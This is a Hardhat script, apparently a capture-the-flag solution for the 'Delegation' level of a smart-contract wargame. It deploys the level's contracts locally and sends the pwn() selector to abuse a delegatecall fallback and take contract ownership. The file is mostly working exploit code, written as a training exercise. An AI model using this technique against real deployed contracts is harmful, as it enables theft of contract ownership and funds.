import { ethers, getNamedAccounts } from 'hardhat';

import deployDelegateContract from '../deploy/06-delegate';
import deployContract from '../deploy/06-delegation';

const DELEGATE_CONTRACT_NAME = 'Delegate';
const DELEGATION_CONTRACT_NAME = 'Delegation';

const getContractOwnerName = (newOwner: string, hacker: string) => {
  return newOwner === hacker ? 'hacker' : 'deployer';
};

async function main() {
  console.log(`Passing ${DELEGATE_CONTRACT_NAME} challenge...`);

  const { hacker: hackerAddress } = await getNamedAccounts();
  const hacker = await ethers.getSigner(hackerAddress);

  await deployDelegateContract();

  const contractAddress = await deployContract();
  const contractInstance = await ethers.getContractAt(DELEGATION_CONTRACT_NAME, contractAddress);
  const contract = contractInstance.connect(hacker);

  const initialOwnerAddress = await contract.owner();
  console.log('The owner of the contract is', getContractOwnerName(initialOwnerAddress, hackerAddress));

  const methodId = ethers.id('pwn()').substring(0, 10);

  await hacker.sendTransaction({ to: contractAddress, data: methodId });

  const newOwnerAddress = await contract.owner();
  console.log('The owner of the contract is', getContractOwnerName(newOwnerAddress, hackerAddress));

  console.log('Well done, You have completed this level!!!');
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
